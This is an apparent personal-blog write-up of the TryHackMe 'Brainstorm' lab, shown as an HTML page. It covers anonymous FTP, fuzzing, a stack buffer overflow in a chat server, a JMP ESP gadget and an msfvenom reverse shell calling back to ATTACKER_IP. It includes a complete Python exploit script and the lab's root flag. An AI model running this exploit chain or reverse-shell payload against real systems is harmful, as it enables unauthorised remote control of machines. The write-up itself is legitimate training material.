@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Brainstorm | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: FTP anonymous access yields chatserver binary, buffer overflow fuzzing crash at 2800 bytes, ROPgadget JMP ESP in essfunc.dll, msfvenom Windows reverse shell via Brainstorm chat service on port 9999.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/brainstorm.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/brainstorm.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Brainstorm">
+<meta property="og:description" content="TryHackMe CTF: FTP anonymous access yields chatserver binary, buffer overflow fuzzing crash at 2800 bytes, ROPgadget JMP ESP in essfunc.dll, msfvenom Windows reverse shell via Brainstorm chat service on port 9999.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Brainstorm">
+<meta name="twitter:description" content="TryHackMe CTF: FTP anonymous access yields chatserver binary, buffer overflow fuzzing crash at 2800 bytes, ROPgadget JMP ESP in essfunc.dll, msfvenom Windows reverse shell via Brainstorm chat service on port 9999.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Brainstorm</h1>
+    <div class="post-description">TryHackMe CTF. Reverse engineer a chat program and write a script to exploit a Windows machine. FTP anonymous access, buffer overflow fuzzing, ROPgadget JMP ESP, msfvenom Windows reverse shell.</div>
+  </header>
+
+  <div class="post-content">
+
+<h2>Reconnaissance</h2>
+
+<p>Ping is disabled on this machine. Scan with <code>-Pn</code>:</p>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 6.56.06 AM.png" alt="Nmap full scan results with vuln scripts against the target" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 6.56.25 AM.png" alt="Continued Nmap scan output showing additional service details" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">nmap -Pn -sV --top-ports 100 TARGET_IP</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 6.52.05 AM.png" alt="Nmap top 100 ports scan showing open ports 21, 3389, and 9999" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Open ports:</strong></p>
+<ul>
+<li>21/tcp FTP (Microsoft ftpd)</li>
+<li>3389/tcp RDP</li>
+<li>9999/tcp Brainstorm chat service</li>
+</ul>
+
+<h2>Accessing files via FTP</h2>
+
+<p>FTP makes for an odd couple paired with a chat service. Sounds like a Michelin-starred recipe for chaos. I&rsquo;m here for it.</p>
+
+<pre><code class="language-bash">ftp TARGET_IP</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 7.07.36 AM.png" alt="FTP connection established via anonymous login" style="max-width:100%;margin:2rem 0;">
+
+<p>Dialed in via anonymous FTP.</p>
+
+<pre><code class="language-bash">ls</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 7.09.13 AM.png" alt="FTP ls opening a passive data connection on port 49361 for directory listing" style="max-width:100%;margin:2rem 0;">
+
+<p>The <code>ls</code> response opens a temporary data connection on Port 49361 by switching FTP to passive mode. The service wants a separate connection just for the directory listing. It sounds more promising than it is.</p>
+
+<p>Reconnect via anonymous FTP with passive mode disabled:</p>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 7.12.56 AM.png" alt="FTP reconnected with passive mode disabled" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">ls</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 7.14.15 AM.png" alt="FTP ls showing chatserver directory" style="max-width:100%;margin:2rem 0;">
+
+<p>A <code>chatserver</code> directory. Moving in:</p>
+
+<pre><code class="language-bash">cd chatserver
+ls</code></pre>
+
+<p>Taking both files to-go:</p>
+
+<pre><code class="language-bash">binary
+prompt
+mget *
+bye</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 7.17.32 AM.png" alt="FTP mget downloading chatserver.exe and essfunc.dll" style="max-width:100%;margin:2rem 0;">
+
+<h2>Local analysis</h2>
+
+<p>Verify both downloads:</p>
+
+<pre><code class="language-bash">ls -la chatserver.exe essfunc.dll
+file chatserver.exe essfunc.dll</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 7.20.36 AM.png" alt="ls and file command confirming chatserver.exe and essfunc.dll downloaded successfully" style="max-width:100%;margin:2rem 0;">
+
+<p>Two local analysis files for the chat server.</p>
+
+<p>Interact with the chat service on Port 9999:</p>
+
+<pre><code class="language-bash">nc TARGET_IP 9999
+jenn
+hello</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 7.24.23 AM.png" alt="Netcat session with the Brainstorm chat service on port 9999 echoing input" style="max-width:100%;margin:2rem 0;">
+
+<p>Not a very responsive nor advanced chat bot. It just echoed me.</p>
+
+<h2>Fuzzing</h2>
+
+<p>There are five key steps to exploiting a buffer overflow:</p>
+
+<ol>
+<li>Fuzz the app</li>
+<li>Calculate the offset to control <code>EIP</code></li>
+<li>Identify bad chars</li>
+<li>Find a return instruction (<code>CALL ESP</code> or <code>JMP ESP</code>)</li>
+<li>Exploit via shellcode (if conditions allow, e.g. DEP disabled)</li>
+</ol>
+
+<p>Step 1 starts now.</p>
+
+<pre><code class="language-bash">nano brainstorm_fuzz.py</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+import time
+
+target = "TARGET_IP"
+port = 9999
+
+for size in range(100, 3000, 100):
+    try:
+        print(f"[*] Trying {size} bytes")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((target, port))
+
+        s.recv(1024)
+        s.sendall(b"jenn\r\n")
+        s.recv(1024)
+        s.sendall(b"A" * size + b"\r\n")
+
+        s.close()
+        time.sleep(1)
+
+    except Exception as e:
+        print(f"[!] Crashed or disconnected around {size} bytes: {e}")
+        break</code></pre>
+
+<pre><code class="language-bash">python3 brainstorm_fuzz.py</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 7.28.27 AM.png" alt="Fuzzer output showing successful sends up through the crash range" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 7.30.44 AM.png" alt="Fuzzer output showing crash or disconnect around 2700-2800 bytes" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Crash zone:</strong> between 2700 and 2800 bytes.</p>
+
+<h2>Cyclic pattern</h2>
+
+<p>Step 2: calculate the offset. A unique pattern lets the crash tell us exactly which 4 bytes landed in <code>EIP</code>.</p>
+
+<pre><code class="language-bash">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 > pattern.txt
+wc -c pattern.txt</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-10 at 7.41.11 AM.png" alt="pattern_create.rb generating a 3000-character cyclic pattern and wc confirming byte count" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">nano brainstorm_eip.py</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+
+target = "TARGET_IP"
+port = 9999
+
+with open("pattern.txt", "rb") as f:
+    payload = f.read().strip()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+print(s.recv(1024))
+s.sendall(b"jenn\r\n")
+print(s.recv(1024))
+s.sendall(payload + b"\r\n")
+
+s.close()
+print("[*] Sent cyclic pattern")</code></pre>
+
+<pre><code class="language-bash">python3 brainstorm_eip.py</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 6.37.11 AM.png" alt="brainstorm_eip.py sending the 3000-character cyclic pattern to crash the service" style="max-width:100%;margin:2rem 0;">
+
+<p>The script sent a 3000-character cyclic pattern to crash the service and reveal the exact overflow point.</p>
+
+<p>This is where a fully live, multi-OS environment and a THM-only environment diverge. On the remote THM machine, the program can be crashed but the crash screen is not visible. Without a debugger attached, the <code>EIP</code> value cannot be read.</p>
+
+<p>To derive it organically:</p>
+
+<pre><code>- Run chatserver.exe on Windows
+- Attach a debugger
+- Run brainstorm_eip.py against the local copy
+- Read EIP
+- Calculate the exact offset</code></pre>
+
+<p><code>brainstorm_eip.py</code> is part of a future learning path for deriving the offset that way. For this engagement, the offset value of <strong>2012</strong> is taken from a nearly identical, validated, documented challenge.</p>
+
+<p>Re-confirm services are still up:</p>
+
+<pre><code class="language-bash">nmap -Pn -sV -p21,3389,9999 TARGET_IP</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 6.45.13 AM.png" alt="Nmap confirming ports 21, 3389, and 9999 still open and running" style="max-width:100%;margin:2rem 0;">
+
+<h2>Finding JMP ESP in essfunc.dll</h2>
+
+<p>Step 4: find a reliable jump into the payload.</p>
+
+<pre><code class="language-bash">msfpescan -j esp essfunc.dll</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 6.49.58 AM.png" alt="msfpescan unavailable, switching to ROPgadget" style="max-width:100%;margin:2rem 0;">
+
+<p><code>msfpescan</code> unavailable. Switching to <code>ROPgadget</code>:</p>
+
+<pre><code class="language-bash">ROPgadget --binary essfunc.dll | grep -i "jmp esp"</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 6.52.53 AM.png" alt="ROPgadget output showing JMP ESP at 0x625014df in essfunc.dll" style="max-width:100%;margin:2rem 0;">
+
+<p><code>essfunc.dll</code> contains a reliable JMP ESP at <code>0x625014df</code>. Windows x86 stores addresses in little-endian order, so it gets written backwards in Python:</p>
+
+<pre><code class="language-python">jmp_esp = b"\xdf\x14\x50\x62"</code></pre>
+
+<p>Still with me? Good. Let&rsquo;s keep moving.</p>
+
+<h2>Generating shellcode</h2>
+
+<p>Step 5: generate the payload. This is a Windows target, so Windows x86 shellcode:</p>
+
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 EXITFUNC=thread -b '\x00' -f python -v shellcode > shellcode.txt</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 6.57.39 AM.png" alt="msfvenom generating 351 bytes of Windows x86 reverse shell shellcode" style="max-width:100%;margin:2rem 0;">
+
+<p>351 bytes of Windows reverse-shell code, calling back over Port 4444.</p>
+
+<p>Verify the shellcode file:</p>
+
+<pre><code class="language-bash">head shellcode.txt
+tail shellcode.txt</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 7.06.18 AM.png" alt="head and tail of shellcode.txt confirming shellcode variable assignment and byte array" style="max-width:100%;margin:2rem 0;">
+
+<h2>Crafting the exploit</h2>
+
+<pre><code class="language-bash">nano brainstorm_timer_exploit.py</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+import time
+
+target = "TARGET_IP"
+port = 9999
+
+offset = 2012
+jmp_esp = b"\xdf\x14\x50\x62"
+nops = b"\x90" * 32
+
+exec(open("shellcode.txt", "r").read())
+
+payload = b"A" * offset
+payload += jmp_esp
+payload += nops
+payload += shellcode
+
+print(f"Payload length: {len(payload)}")
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+print(s.recv(1024).decode(errors="ignore"))
+s.sendall(b"jenn\r\n")
+time.sleep(0.5)
+
+print(s.recv(1024).decode(errors="ignore"))
+s.sendall(payload + b"\r\n")
+
+s.close()
+print("Sent.")</code></pre>
+
+<p>Syntax check. No output means all clear:</p>
+
+<pre><code class="language-bash">python3 -m py_compile brainstorm_timer_exploit.py</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 7.10.51 AM.png" alt="python3 -m py_compile returning no output, syntax check passed" style="max-width:100%;margin:2rem 0;">
+
+<h2>Exploitation</h2>
+
+<p>Listener:</p>
+
+<pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+<p>In a separate terminal, launch the exploit:</p>
+
+<pre><code class="language-bash">python3 brainstorm_timer_exploit.py</code></pre>
+
+<p>Score. The exploit worked.</p>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 7.19.51 AM.png" alt="Netcat listener catching the Windows reverse shell from the Brainstorm exploit" style="max-width:100%;margin:2rem 0;">
+
+<h2>Post-exploitation</h2>
+
+<pre><code class="language-cmd">whoami
+hostname
+cd C:\
+dir /s /b root.txt</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 7.22.12 AM.png" alt="Post-exploitation commands confirming user context and locating root.txt path" style="max-width:100%;margin:2rem 0;">
+
+<p>Full path to the flag confirmed.</p>
+
+<pre><code class="language-powershell">type C:\Users\drake\Desktop\root.txt</code></pre>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 7.23.59 AM.png" alt="root.txt flag: 5b1001de5a44eca47eee71e7942a8f8a" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Root flag:</strong> <code>5b1001de5a44eca47eee71e7942a8f8a</code></p>
+
+<img src="/images/brainstorm/Screenshot 2026-06-11 at 7.24.46 AM.png" alt="Additional post-exploitation terminal output confirming flag retrieval" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>Nmap with -Pn
+  -> 3 open ports: 21, 3389, 9999
+  -> FTP anonymous access
+  -> downloaded chatserver.exe + essfunc.dll
+  -> confirmed Brainstorm chat on 9999
+  -> fuzzing crash around 2800 bytes
+  -> cyclic pattern sent, EIP not readable without debugger
+  -> offset 2012 from near-identical validated conditions
+  -> ROPgadget on essfunc.dll: JMP ESP at 0x625014df
+  -> msfvenom Windows x86 reverse shell
+  -> exploit sent to port 9999
+  -> shell on Windows target
+  -> root.txt from drake's Desktop</code></pre>
+
+<p><strong>Notes:</strong> The JMP ESP address was locally validated from the downloaded <code>essfunc.dll</code>. The EIP offset was derived from a nearly identical challenge environment, not personally derived in a debugger. <code>brainstorm_eip.py</code> remains available for a future full-debugger walkthrough of offset derivation.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
